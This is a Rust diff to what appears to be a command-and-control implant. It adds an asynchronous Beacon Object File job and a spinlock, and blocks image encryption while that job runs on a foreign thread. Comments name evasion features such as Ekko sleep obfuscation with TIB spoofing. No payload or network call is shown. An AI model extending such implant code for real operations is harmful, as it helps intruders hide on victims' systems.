@@ -115,6 +115,10 @@ pub struct Instance {
     pub upload: Option<crate::tasks::UploadState>,
     /// BOF runtime outputs waiting for the next POSTs (one BOF at a time).
     pub bof_pending: Option<crate::coff::BofPending>,
+    /// Async BOF run (one at a time): worker thread + heap context.
+    pub bof_job: Option<crate::coff::BofJob>,
+    /// Spinlock guarding the BOF output queue (BOF thread vs beacon thread).
+    pub bof_lock: core::sync::atomic::AtomicBool,
     /// Threadpool sleep + TIB spoof state (port of sleep.c 160-560).
     pub ekko: crate::runtime::ekko::EkkoState,
     /// Debug channel handle (0 = closed/absent; `config::DEBUG` builds).
@@ -461,6 +465,8 @@ unsafe fn bootstrap() -> Option<Instance> {
         tunnels_len: 0,
         upload: None,
         bof_pending: None,
+        bof_job: None,
+        bof_lock: core::sync::atomic::AtomicBool::new(false),
         ekko,
         // The handle opened at the very top of the bootstrap carries over.
         debug_handle: dbg,
@@ -937,6 +943,10 @@ pub unsafe fn main() -> ! {
 /// (ps run, shell) or non-closing tunnel runs beacon code on a foreign
 /// thread — the image cannot be encrypted while one is in flight.
 fn async_active(instance: &Instance) -> bool {
+    // An async BOF runs beacon code (and its mapFuncs) on a foreign thread.
+    if instance.bof_job.is_some() {
+        return true;
+    }
     let mut i = 0usize;
     while i < instance.jobs_len {
         if !instance.jobs[i].killed {
